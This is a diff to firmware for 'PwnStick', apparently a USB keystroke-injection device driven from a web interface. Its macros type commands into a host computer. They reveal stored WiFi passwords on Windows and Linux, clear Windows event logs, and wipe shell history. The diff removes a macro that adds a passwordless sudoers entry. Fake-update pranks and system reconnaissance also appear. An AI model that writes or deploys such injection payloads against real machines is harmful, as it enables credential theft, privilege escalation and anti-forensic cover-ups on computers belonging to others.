@@ -64,7 +64,7 @@ const char index_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html>
 <head>
-<title>PwnStick v50</title>
+<title>PwnStick v51</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <style>
 * { user-select:none; -webkit-user-select:none; box-sizing:border-box; }
@@ -114,7 +114,7 @@ input[type=number] { background:#000; color:#0f0; border:1px solid #0f0; width:4
         <button id="mod-ctrl" onmousedown="mD('ctrl',this)" onmouseup="mU('ctrl',this)">CTRL</button>
         <button id="mod-alt" onmousedown="mD('alt',this)" onmouseup="mU('alt',this)">ALT</button>
         <button id="mod-shift" onmousedown="mD('shift',this)" onmouseup="mU('shift',this)">SHIFT</button>
-        <button onclick="oM()" style="background:#050;border-color:#0f0;color:#fff;flex:1.5">LIBRARY (MACROS)</button>
+        <button onclick="oM()" style="background:#050;border-color:#0f0;color:#fff;flex:1.5">MACROS</button>
     </div>
     <textarea id="ta" placeholder="Type here..."></textarea>
     <div id="pad-wrap">
@@ -150,7 +150,7 @@ const mcs = {
         {n:'Terminal', a:'term'}, {n:'Calculator', a:'calc'}, {n:'SSH Snake', a:'snake'},
         {n:'Rickroll', a:'rick'}, {n:'Sys Recon', a:'lin_recon'}, 
         {n:'Net Info', a:'lin_net'}, {n:'WiFi Pass', a:'lin_wifi'},
-        {n:'Fake Update', a:'lin_fake'}, {n:'Add Sudoer', a:'lin_sudo'}
+        {n:'Fake Update', a:'fake_upd'}
     ]
 };
 function wsS(m){if(ws.readyState===1)ws.send(m);}
@@ -321,16 +321,15 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
             else if(act=="cb") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_BACKSPACE); delay(50); Keyboard.releaseAll(); }
             else if(act=="ps_admin") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('x'); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.print("a"); delay(1000); Keyboard.press(KEY_LEFT_ALT); Keyboard.print("y"); Keyboard.releaseAll(); }
             else if(act=="wifi_pass") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("cmd"); delay(1000); Keyboard.println("netsh wlan show profiles * key=clear | findstr /C:\"Key Content\" /C:\"SSID name\""); }
-            else if(act=="fake_upd") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("https://fakeupdate.net/win10ue/"); delay(1000); Keyboard.write(KEY_F11); }
+            else if(act=="fake_upd") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("https://fakeupdate.net/win10ue/"); delay(1500); Keyboard.write(KEY_F11); }
             else if(act=="note_ghost") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("notepad"); delay(1000); Keyboard.println("I am watching you..."); }
             else if(act=="win_clr") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("powershell -NoP -Command \"Clear-EventLog -LogName System,Application,Security\""); }
             else if(act=="win_info") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("cmd /k systeminfo"); }
             else if(act=="lin_recon") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("hostnamectl; timedatectl; lsusb; lscpu; ip a"); }
             else if(act=="lin_net") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("ip addr; nmcli device wifi list"); }
             else if(act=="lin_ls") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("history -c && history -w && exit"); }
-            else if(act=="lin_sudo") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("echo \"$USER ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/99-pwn"); }
             else if(act=="lin_wifi") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"); }
-            else if(act=="lin_fake") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.println("xdg-open 'https://fakeupdate.net/linux/'"); delay(1000); Keyboard.write(KEY_F11); }
+            else if(act=="lin_fake") { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(500); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.print("xdg-open 'https://fakeupdate.net/steam/'"); delay(50); Keyboard.write(KEY_RETURN); delay(1500); Keyboard.write(KEY_F11); }
             else if(act=="term") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("cmd"); } else { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(300); Keyboard.releaseAll(); } }
             else if(act=="calc") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("calc"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(500); Keyboard.releaseAll(); delay(1000); if(sp) Keyboard.print(" "); Keyboard.print("gnome-calculator"); delay(100); Keyboard.write(KEY_RETURN); } }
             else if(act=="rick") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(300); Keyboard.releaseAll(); delay(800); if(sp) Keyboard.print(" "); Keyboard.print("xdg-open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"); delay(50); Keyboard.write(KEY_RETURN); } }
